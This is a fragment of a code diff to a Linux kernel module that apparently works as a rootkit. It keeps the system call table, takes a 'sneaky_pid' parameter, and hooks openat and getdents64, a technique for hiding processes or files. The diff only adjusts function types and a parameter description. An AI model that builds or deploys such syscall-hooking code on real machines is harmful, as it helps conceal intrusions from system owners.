@@ -17,7 +17,7 @@ static unsigned long *sys_call_table;
 MODULE_LICENSE("GPL");
 char *sneaky_pid = "";
 module_param(sneaky_pid, charp, 0000);
-MODULE_PARM_DESC(sneaky_pid, "sneaky_pid");
+MODULE_PARM_DESC(pid, "sneaky_pid");
 
 struct linux_dirent64 {
 	unsigned long	d_ino;
@@ -67,9 +67,9 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 }
 
 //------------getdents64------------//
-asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
-asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
+asmlinkage long sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
 {
   int og_num = original_getdents64(fd, dirp, count); // num byte read
   if (og_num == 0)
